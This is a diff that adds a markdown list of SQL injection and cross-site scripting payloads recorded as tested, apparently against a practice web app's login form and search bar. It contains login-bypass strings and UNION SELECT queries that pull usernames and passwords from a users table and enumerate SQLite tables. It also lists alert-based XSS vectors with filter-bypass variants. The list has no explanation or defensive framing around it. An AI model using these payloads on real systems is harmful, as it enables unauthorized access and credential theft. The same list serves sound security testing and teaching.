@@ -1,0 +1,42 @@
+# SQL INJECTION PAYLOADS TESTED
+
+## Login Form
+- admin' OR '1'='1
+- ' OR '1'='1' --
+- admin'--
+- ' OR 1=1;--
+
+## Search Bar
+- %' OR '1'='1
+- %' UNION SELECT username, email FROM users --
+- %' UNION SELECT username, password FROM users --
+- %' UNION SELECT sqlite_version(), '2' --
+- %' UNION SELECT name, '2' FROM sqlite_master WHERE type='table' --
+
+# XSS PAYLOADS TESTED
+
+## Basic Script
+- <script>alert('XSS')</script>
+- <script>alert(1)</script>
+
+## Image Tag
+- <img src=x onerror=alert('XSS')>
+- <img src=x onerror=alert(1)>
+
+## SVG Tag
+- <svg onload=alert('XSS')>
+- <svg onload=alert(1)>
+
+## Body Tag
+- <body onload=alert('XSS')>
+
+## Input Tag
+- <input onfocus=alert('XSS') autofocus>
+
+## JavaScript URI
+- javascript:alert('XSS')
+
+## Bypass Attempts
+- <ScRiPt>alert('XSS')</ScRiPt>
+- %3Cscript%3Ealert('XSS')%3C/script%3E
+- <scr<script>ipt>alert('XSS')</scr</script>ipt>
